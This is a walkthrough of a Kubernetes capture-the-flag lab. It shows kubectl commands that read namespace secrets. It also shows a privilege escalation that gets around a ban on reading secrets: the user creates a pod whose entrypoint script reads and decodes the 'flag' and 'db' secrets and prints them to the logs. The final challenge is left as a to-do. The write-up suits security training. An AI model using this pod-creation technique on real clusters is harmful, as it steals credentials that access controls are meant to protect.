# First K8S CTF - Walktrough

## Easy challenge
list namespaces:  
```bash
kubectl get ns

NAME              STATUS   AGE
default           Active   7m40s
easy              Active   7m35s
kube-node-lease   Active   7m41s
kube-public       Active   7m41s
kube-system       Active   7m42s
medium            Active   7m35s
```  

You can see two interesting namespaces: `easy` and `medium`.  
We will start from the easy one.  

List the secrets in the *easy* namespace:  
```bash
kubectl -n easy get secrets

NAME                 TYPE     DATA   AGE
definitelynotaflag   Opaque   1      10m
flag                 Opaque   1      10m
```  

Retrieve the `flag` secret:  
```bash
kubectl get secret flag -n easy -o=jsonpath='{.data.flag}' | base64 --decode

this is not the flag!
```  

We are not lucky, let's try with the other secret:  
```bash
kubectl get secret definitelynotaflag -n easy -o=jsonpath='{.data.flag}' | base64 --decode

CTF{easy-flag-XWgkxvenoWWwj1AY}
```  
Congrats! you solved the easy challenge!  
Too easy you say?  
Don't worry, things are gonna get harder from here 😈  

## Medium challenge

List the secrets in the *medium* namespace:  
```bash
kubectl -n medium get secrets

NAME   TYPE     DATA   AGE
db     Opaque   1      17m
flag   Opaque   1      17m
```  
Retrieve the `flag` secret:  
```bash
kubectl get secret flag -n medium -o=jsonpath='{.data.flag}' | base64 --decode

Error from server (Forbidden): secrets "flag" is forbidden: User "ctf1" cannot get resource "secrets" in API group "" in the namespace "medium"
```  

It seems that we are not allowed to retrieve secrets in this namespace...let's confirm this:  
```bash
kubectl auth can-i get secrets --namespace=medium

no
```  
What a shame!  
Let's try to get all the resources we can in the *medium* namespace:  
```bash
kubectl -n medium get all

NAME                                 READY   STATUS             RESTARTS        AGE
nginx-deployment-6b7f675859-ph8t5    1/1     Running            0               23m
nginx-deployment-6b7f675859-vz56h    1/1     Running            0               23m
Error from server (Forbidden): replicationcontrollers is forbidden: User "ctf1" cannot list resource "replicationcontrollers" in API group "" in the namespace "medium"
Error from server (Forbidden): services is forbidden: User "ctf1" cannot list resource "services" in API group "" in the namespace "medium"
Error from server (Forbidden): daemonsets.apps is forbidden: User "ctf1" cannot list resource "daemonsets" in API group "apps" in the namespace "medium"
Error from server (Forbidden): deployments.apps is forbidden: User "ctf1" cannot list resource "deployments" in API group "apps" in the namespace "medium"
Error from server (Forbidden): replicasets.apps is forbidden: User "ctf1" cannot list resource "replicasets" in API group "apps" in the namespace "medium"
Error from server (Forbidden): statefulsets.apps is forbidden: User "ctf1" cannot list resource "statefulsets" in API group "apps" in the namespace "medium"
Error from server (Forbidden): horizontalpodautoscalers.autoscaling is forbidden: User "ctf1" cannot list resource "horizontalpodautoscalers" in API group "autoscaling" in the namespace "medium"
Error from server (Forbidden): cronjobs.batch is forbidden: User "ctf1" cannot list resource "cronjobs" in API group "batch" in the namespace "medium"
Error from server (Forbidden): jobs.batch is forbidden: User "ctf1" cannot list resource "jobs" in API group "batch" in the namespace "medium"
```  
It seems that we are able to retrieve the list of pods in this namespace.  

Are we able to exec into one?
```bash
kubectl -n medium exec nginx-deployment-6b7f675859-ph8t5 -- /bin/sh

Error from server (Forbidden): pods "nginx-deployment-6b7f675859-ph8t5" is forbidden: User "ctf1" cannot create resource "pods/exec" in API group "" in the namespace "medium"
```  
nope.  
At this point, put on your hacker hat and try to engage in some adversarial thinking 🤔  


`hint`: try to play around with **kubectl auth can-i** in order to understand what you can do in this namespace.  

After a while, you will discover that you are able to create pods in the *medium* namespace:  
```bash
kubectl auth can-i create pods --namespace=medium

yes
```  

Knowing this you can attempt to read the secrets from a pod deployed to the *medium* namespace.  
Proceed as follow:  
1. Create the following dockerfile  

```dockerfile
FROM alpine:latest
RUN apk --no-cache add curl
RUN curl -LO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl && \
    chmod +x ./kubectl && \
    mv ./kubectl /usr/local/bin/kubectl

# Set the entrypoint script
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```  
2. Create the following `entrypoint.sh` file  
```bash
#!/bin/sh

# Read and decode the 'flag' secret
flag_secret=$(kubectl get secret flag -n medium -o=jsonpath='{.data.flag}')
decoded_flag=$(echo "$flag_secret" | base64 -d)

# Read and decode the 'db' secret
db_secret=$(kubectl get secret db -n medium -o=jsonpath='{.data.flag}')
decoded_db=$(echo "$db_secret" | base64 -d)

# Output the decoded secrets
echo "Flag Secret: $decoded_flag"
echo "DB Secret: $decoded_db"
```  

3. Build and push the docker image (you can use a free and disposable public registry like [*ttl.sh*](https://ttl.sh/))
```bash
docker build -t ttl.sh/ctf1:latest . && docker push ttl.sh/ctf1:latest
```  
4. Deploy a pod with that image:  
```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: ctf1-pod
  namespace: medium
spec:
  containers:
  - name: k8sctf1-container
    image: ttl.sh/ctf1:latest
EOF
```  
5. retrieve the list of running podss
```bash
Kubectl -n medium get pods

NAME                                READY   STATUS             RESTARTS        AGE
ctf1-pod                            0/1     Completed          0               1m12s
nginx-deployment-6b7f675859-4pkpk   1/1     Running            0               11m
nginx-deployment-6b7f675859-kvb9c   1/1     Running            0               11m
```  
6. retrieve the logs for that pod
```bash
kubectl -n medium logs ctf1-pod

Flag Secret: this is not the flag!
DB Secret: CTF{medium-flag-zPBBTUPD2mXuZZU3}
```  

Congrats, you pawned the second challenge!  🥳 🎉  

## Hard challenge

**TO DO**  





